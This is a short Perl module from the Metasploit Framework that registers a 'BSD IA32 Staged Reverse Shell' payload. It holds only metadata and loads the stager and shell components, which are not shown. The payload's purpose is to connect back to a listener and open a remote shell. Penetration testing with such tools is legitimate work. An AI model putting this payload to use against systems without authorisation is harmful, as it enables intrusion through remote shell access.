
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::bsd_ia32_reverse_stg;
use strict;
use base 'Msf::PayloadComponent::BSD::ia32::ShellStage';

my $info =
{
	'Name'        => 'BSD IA32 Staged Reverse Shell',
	'Version'     => '$Revision$',
	'Description' => 'Connect back on a port and spawn a shell as a stage',
};

sub _Load
{
	Msf::PayloadComponent::BSD::ia32::ShellStage->_Import('Msf::PayloadComponent::BSD::ia32::ReverseStager');

	__PACKAGE__->SUPER::_Load();
}

sub new
{
	my $class = shift;
	my $hash  = @_ ? shift : { };

	_Load();

	$hash = $class->MergeHashRec($hash, { 'Info' => $info });

	my $self = $class->SUPER::new($hash, @_);

	return $self;
}

1;
